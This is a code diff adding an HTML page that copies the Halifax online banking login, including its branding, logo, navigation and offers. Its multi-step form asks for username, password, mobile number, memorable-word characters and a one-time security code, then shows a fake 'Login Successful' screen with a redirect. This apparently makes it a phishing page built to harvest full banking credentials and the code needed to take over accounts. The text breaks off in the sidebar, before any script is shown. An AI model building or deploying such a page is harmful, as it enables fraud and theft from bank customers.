@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Halifax | Online Banking Login</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --bl: #003781; --bm: #004B9B; --bl2: #002558; --ac: #00A3E0; --bg: #F0F4F8; --bk: #1a1a1a; --gt: #4a4a4a; --gb: #ccc; }
+    body { font-family: 'Helvetica Neue', Arial, sans-serif; background: var(--bg); color: var(--bk); min-height: 100vh; display: flex; flex-direction: column; }
+    .topbar { background: var(--bl2); display: flex; align-items: center; padding: 0 24px; height: 36px; }
+    .topbar a { color: #aac4e8; font-size: 12px; padding: 0 12px; text-decoration: none; border-right: 1px solid #1a3a6a; }
+    .topbar a:first-child { padding-left: 0; }
+    .topbar a:hover { color: #fff; }
+    header { background: var(--bl); padding: 0 32px; display: flex; align-items: center; justify-content: space-between; height: 72px; box-shadow: 0 2px 8px rgba(0,0,0,.3); }
+    .logo-badge{width:60px;height:60px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;}
+    .logo { display: flex; align-items: center; gap: 14px; text-decoration: none; }
+    .logo-mark { width: 52px; height: 52px; position: relative; }
+    .logo-text { color: #fff; font-size: 28px; font-weight: 900; letter-spacing: -0.5px; font-style: italic; }
+    .header-tagline { color: rgba(255,255,255,.75); font-size: 12px; font-style: italic; }
+    .header-right { display: flex; align-items: center; gap: 20px; }
+    .header-right a { color: rgba(255,255,255,.85); font-size: 13px; text-decoration: none; }
+    .header-right a:hover { color: #fff; text-decoration: underline; }
+    nav { background: var(--bm); display: flex; padding: 0 32px; }
+    nav a { color: rgba(255,255,255,.8); font-size: 13px; font-weight: 600; padding: 12px 16px; text-decoration: none; border-bottom: 3px solid transparent; }
+    nav a:hover { color: #fff; background: rgba(255,255,255,.08); }
+    nav a.active { color: #fff; border-bottom-color: var(--ac); }
+    main { flex: 1; display: flex; justify-content: center; padding: 40px 20px 60px; }
+    .wrap { width: 100%; max-width: 980px; display: grid; grid-template-columns: 1fr 320px; gap: 28px; align-items: start; }
+    .card { background: #fff; border-radius: 3px; box-shadow: 0 1px 4px rgba(0,0,0,.1); overflow: hidden; }
+    .card-top { background: var(--bl); padding: 20px 28px; }
+    .card-top h1 { color: #fff; font-size: 22px; font-weight: 700; }
+    .steps-bar { display: flex; background: var(--bl2); padding: 0 28px; }
+    .sbar-item { flex: 1; display: flex; align-items: center; justify-content: center; gap: 7px; padding: 10px 4px; font-size: 11px; font-weight: 700; color: rgba(255,255,255,.45); border-bottom: 3px solid transparent; }
+    .sbar-item.active { color: #fff; border-bottom-color: var(--ac); }
+    .sbar-item.done { color: rgba(255,255,255,.7); }
+    .sbar-num { width: 20px; height: 20px; border-radius: 50%; background: rgba(255,255,255,.2); color: rgba(255,255,255,.5); font-size: 10px; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .sbar-item.active .sbar-num { background: var(--ac); color: #fff; }
+    .sbar-item.done .sbar-num { background: #2ecc71; color: #fff; }
+    .card-body { padding: 28px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .fg { margin-bottom: 20px; }
+    .fg label { display: block; font-size: 13px; font-weight: 700; color: var(--bk); margin-bottom: 6px; }
+    .fg input { width: 100%; padding: 11px 14px; border: 1.5px solid var(--gb); border-radius: 3px; font-size: 15px; color: var(--bk); outline: none; transition: border-color .15s; }
+    .fg input:focus { border-color: var(--bm); box-shadow: 0 0 0 3px rgba(0,75,155,.12); }
+    .fg input[type=password] { letter-spacing: 3px; font-size: 18px; }
+    .hint { font-size: 12px; color: var(--gt); margin-top: 5px; line-height: 1.5; }
+    .chk { display: flex; align-items: center; gap: 10px; font-size: 13px; cursor: pointer; margin-bottom: 22px; }
+    .chk input { width: 18px; height: 18px; accent-color: var(--bm); }
+    .btn { width: 100%; padding: 14px; background: var(--bm); color: #fff; font-size: 15px; font-weight: 700; border: none; border-radius: 3px; cursor: pointer; transition: background .15s; margin-bottom: 16px; }
+    .btn:hover { background: var(--bl2); }
+    hr { border: none; border-top: 1px solid #eee; margin: 18px 0; }
+    .links { display: flex; flex-direction: column; gap: 10px; }
+    .links a { font-size: 13px; color: var(--bm); text-decoration: underline; cursor: pointer; }
+    /* Memorable chars step */
+    .mem-word-box { background: #EEF4FB; border: 1px solid #c0d4ee; border-radius: 3px; padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: var(--bl2); line-height: 1.6; }
+    .mem-word-box strong { display: block; margin-bottom: 4px; font-size: 14px; }
+    .char-row { display: flex; gap: 12px; flex-wrap: wrap; }
+    .char-fg { display: flex; flex-direction: column; align-items: center; gap: 6px; }
+    .char-fg label { font-size: 11px; font-weight: 700; color: var(--bl); text-transform: uppercase; letter-spacing: .5px; }
+    .char-fg input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1.5px solid var(--gb); border-radius: 3px; outline: none; color: var(--bk); }
+    .char-fg input:focus { border-color: var(--bm); box-shadow: 0 0 0 3px rgba(0,75,155,.12); }
+    /* OTP step */
+    .otp-info { background: #EEF4FB; border: 1px solid #c0d4ee; border-left: 4px solid var(--bm); border-radius: 3px; padding: 14px 16px; margin-bottom: 22px; font-size: 13px; color: var(--bl2); line-height: 1.6; }
+    .otp-info strong { display: block; font-size: 14px; margin-bottom: 4px; }
+    .otp-boxes { display: flex; gap: 10px; margin-bottom: 6px; }
+    .otp-boxes input { width: 48px; height: 56px; text-align: center; font-size: 22px; font-weight: 700; border: 1.5px solid var(--gb); border-radius: 3px; outline: none; color: var(--bk); }
+    .otp-boxes input:focus { border-color: var(--bm); box-shadow: 0 0 0 3px rgba(0,75,155,.12); }
+    .resend { font-size: 12px; color: var(--gt); margin-bottom: 22px; }
+    .resend a { color: var(--bm); text-decoration: underline; }
+    /* Granted */
+    .granted { text-align: center; padding: 20px 0; }
+    .tick { width: 72px; height: 72px; background: #2ecc71; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .4s ease; }
+    @keyframes pop { 0%{transform:scale(.4);opacity:0} 80%{transform:scale(1.1)} 100%{transform:scale(1);opacity:1} }
+    .granted h2 { font-size: 22px; font-weight: 700; color: var(--bl2); margin-bottom: 10px; }
+    .granted p { font-size: 14px; color: var(--gt); line-height: 1.6; margin-bottom: 6px; }
+    .redir { margin-top: 24px; background: #EEF4FB; border: 1px solid #c0d4ee; border-radius: 3px; padding: 14px; font-size: 13px; color: var(--bl2); }
+    .redir strong { display: block; font-size: 15px; margin-bottom: 4px; }
+    .prog-track { margin-top: 10px; height: 5px; background: #c0d4ee; border-radius: 3px; overflow: hidden; }
+    .prog-fill { height: 100%; width: 0%; background: var(--bm); }
+    /* Sidebar */
+    .side { display: flex; flex-direction: column; gap: 20px; }
+    .ibox { background: #fff; border-radius: 3px; box-shadow: 0 1px 4px rgba(0,0,0,.08); overflow: hidden; }
+    .ibox-h { background: var(--bl); padding: 12px 16px; color: #fff; font-size: 13px; font-weight: 700; }
+    .ibox-b { padding: 16px; font-size: 13px; color: var(--gt); line-height: 1.5; }
+    .ibox-b a { color: var(--bm); text-decoration: underline; }
+    .ibox-b p { margin-bottom: 8px; }
+    .warn { background: #FFF8E1; border: 1px solid #F0C040; border-left: 4px solid #e6a817; border-radius: 3px; padding: 14px 16px; font-size: 12px; color: #5A4500; line-height: 1.5; }
+    footer { background: var(--bl2); padding: 20px 32px; }
+    .flinks { display: flex; flex-wrap: wrap; gap: 4px 0; margin-bottom: 12px; }
+    .flinks a { color: #aac4e8; font-size: 12px; text-decoration: none; padding: 0 12px; border-right: 1px solid #1a3a6a; }
+    .flinks a:first-child { padding-left: 0; }
+    .flinks a:last-child { border-right: none; }
+    .fcopy { color: #6a90b8; font-size: 11px; line-height: 1.6; }
+    @media (max-width: 720px) { .wrap { grid-template-columns: 1fr; } header, nav { padding-left: 16px; padding-right: 16px; } }
+  
+    @keyframes ld-spin  { to { transform: rotate(360deg); } }
+    @keyframes ld-dots  { 0%,80%,100%{transform:scale(0)}40%{transform:scale(1)} }
+  
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <a href="#">Personal</a>
+  <a href="#">Business</a>
+  <a href="#">Community</a>
+  <a href="#">Help &amp; Support</a>
+</div>
+
+<header>
+  <a class="logo" href="#"><div class="logo-badge"><img src="data:image/png;base64,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" alt="Halifax" style="width:56px;height:56px;object-fit:contain;"/></div></a>
+  <div class="header-right">
+    <a href="#">Personal</a>
+    <a href="#">Mortgages</a>
+    <a href="#">Savings</a>
+    <a href="#">Help</a>
+  </div>
+</header>
+
+<nav>
+  <a href="#">Current Accounts</a>
+  <a href="#">Savings</a>
+  <a href="#">Mortgages</a>
+  <a href="#">Credit Cards</a>
+  <a href="#" class="active">Online Banking</a>
+</nav>
+
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="card-top">
+        <h1>Log in to Online Banking</h1>
+      </div>
+      <div class="steps-bar">
+        <div class="sbar-item active" id="sb1"><span class="sbar-num">1</span> Your details</div>
+        <div class="sbar-item" id="sb2"><span class="sbar-num">2</span> Memorable word</div>
+        <div class="sbar-item" id="sb3"><span class="sbar-num">3</span> One-time code</div>
+        <div class="sbar-item" id="sb4"><span class="sbar-num">4</span> Access granted</div>
+      </div>
+      <div class="card-body">
+
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="uid">Username</label>
+            <input type="text" id="uid" autocomplete="username" />
+            <p class="hint">You created your username when you registered. It's not your sort code or account number.</p>
+          </div>
+          <div class="fg">
+            <label for="pwd">Password</label>
+            <input type="password" id="pwd" autocomplete="current-password" />
+            <p class="hint">Your password is case sensitive and must be at least 8 characters.</p>
+          </div>
+          <div class="fg">
+            <label for="hfx-mobile">Registered mobile number</label>
+            <input type="tel" id="hfx-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
+            <p class="hint">We&rsquo;ll send your one-time security code to this number in step 3.</p>
+          </div>
+          <label class="chk"><input type="checkbox" /> Remember my username on this device</label>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your username?</a>
+            <a href="#">Forgotten your password?</a>
+            <a href="#">Register for Online Banking</a>
+          </div>
+        </div>
+
+        <!-- STEP 2: Memorable word characters -->
+        <div class="step" id="step2">
+          <div class="mem-word-box">
+            <strong>Enter specific characters from your memorable word</strong>
+            To protect your account, we only ask for certain characters each time. Do not share your memorable word with anyone.
+          </div>
+          <div class="fg">
+            <label>Please enter the following characters</label>
+            <div class="char-row" id="char-row"></div>
+            <p class="hint" style="margin-top:12px;">Characters are not case sensitive.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back</a>
+            <a href="#">I've forgotten my memorable word</a>
+          </div>
+        </div>
+
+        <!-- STEP 3: OTP -->
+        <div class="step" id="step3">
+          <div class="otp-info">
+            <strong>We've sent you a security code</strong>
+            A 6-digit code has been sent to your registered mobile number ending <strong id="hfx-mobile-hint"></strong>. It's valid for 10 minutes.
+          </div>
+          <div class="fg">
+            <label>Enter your 6-digit security code</label>
+            <div class="otp-boxes">
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="hfx-otp" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend">Didn't receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use the Halifax app instead</a></p>
+          <button class="btn" onclick="goWithLoader(4,this)">Verify &amp; Log in</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(2);return false;">&larr; Back</a>
+          </div>
+        </div>
+
+        <!-- STEP 4: Granted -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick">
+              <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+                <path d="M8 19l8 8 14-14" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <h2>Login Successful</h2>
+            <p>You are now logged in to Halifax Online Banking.</p>
+            <p>Taking you to your accounts&hellip;</p>
+            <div class="redir">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the Halifax website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'" style="transition:transform .2s,box-shadow .2s;">
+        <div style="height:4px;background:#0056A6;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M3 6h10M10 3l3 3-3 3M15 12H5M8 15l-3-3 3-3" stroke="#0056A6" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#0056A6;background:#E8F0FB;padding:3px 10px;border-radius:20px;">Switching Offer</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#0056A6;line-height:1;margin-bottom:6px;">£175</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Switch & earn £175 in cash</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Move to a Halifax Reward Current Account with the Current Account Switch Service and receive £175 within 3 days. Earn a monthly reward too. T&amp;Cs apply.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#0056A6;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Switch to Halifax <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#0056A6" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'" style="transition:transform .2s,box-shadow .2s;">
+        <div style="height:4px;background:#0056A6;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M6 16h6M9 13v3M5 2H3v4a3 3 0 003 3h6a3 3 0 003-3V2h-2M5 2h8" stroke="#0056A6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#0056A6;background:#E8F0FB;padding:3px 10px;border-radius:20px;">Prize Draw</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#0056A6;line-height:1;margin-bottom:6px;">£100,000</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Halifax Savers Prize Draw</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Save regularly in a qualifying Halifax savings account and be automatically entered each month. Top prize of £100,000 — plus hundreds of smaller prizes.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#0056A6;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Open a savings account <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#0056A6" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="warn">
+        <strong>Stay safe online</strong><br/>Halifax will <strong>never</strong> ask for your full password, PIN, or request you move money to another account. Always log in directly at halifax.co.uk.
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Halifax Mobile Banking</div>
+        <div class="ibox-b">
+          <p>Manage your accounts on the go with the Halifax app. Fast, secure and free to download.</p>
+          <p><a href="#">Download on the App Store</a></p>
+          <p><a href="#">Get it on Google Play</a></p>
+        </div>
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Need help?</div>
+        <div class="ibox-b">
+          <p>Call us on <strong>0345 720 3040</strong></p>
